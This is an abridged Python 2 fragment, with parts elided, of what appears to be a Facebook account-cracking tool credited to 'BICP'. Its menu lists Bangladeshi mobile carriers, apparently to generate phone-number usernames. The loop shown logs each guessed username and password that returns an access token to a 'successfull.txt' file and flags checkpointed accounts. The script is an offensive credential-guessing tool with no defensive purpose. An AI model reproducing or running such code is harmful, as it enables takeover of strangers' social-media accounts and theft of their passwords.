...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : BICP (CO-CEO)'
    print '\x1b[1;91mFACEBOOK : BICP.Team.Help.Zone'
    print '\x1b[1;91mGITHUB  : github.com/BICP.Team.Help.Zone'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print '\x1b[1;92m[2]  ROBI'
    print '\x1b[1;92m[3]  AIRTEL'
    print '\x1b[1;92m[4]  BANGLALINK(OLD+NEW)'
    print '\x1b[1;92m[5]  TELETALK'
    print '\x1b[1;92m[6]  GRAMEENPHONE(NEW)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[BICP-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[BICP-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Login 7 Days]\x1b[0m \n'
